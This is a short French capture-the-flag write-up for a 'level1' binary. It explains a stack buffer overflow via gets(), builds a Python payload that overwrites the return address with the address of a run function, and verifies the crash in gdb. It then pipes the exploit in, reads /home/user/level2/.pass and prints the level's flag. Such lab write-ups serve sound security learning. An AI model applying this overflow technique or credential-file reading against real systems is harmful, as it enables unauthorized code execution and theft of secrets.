## GET Flag

Le main à un buffer de 64 et utilise la fonction gets() qui n'a pas de linite de taille à lire, il est donc possible d'effectuer un overflow sur ce buffer.

`python -c 'print "A" * 76 + "B" * 4' > exploit`

Lançons avec gdb :

```
$ gdb ./level1
$ r < exploit

% Stopped reason: SIGSEGV
% 0x42424242 in ?? ()
```

Un segfault apparait car l'accès a l'adresse 0x42424242 n'est pas autorisé. Cette adresse correspond aux caratères "BBBB".

Il est donc possible de mettre l'adresse (en little endian) de la fonction run à la place de ces caractères.
`python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > exploit`

Il est possible de lancer la commande `cat exploit - | ./level1`

`cat  /home/user/level2/.pass`

### Flag

```
level2
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```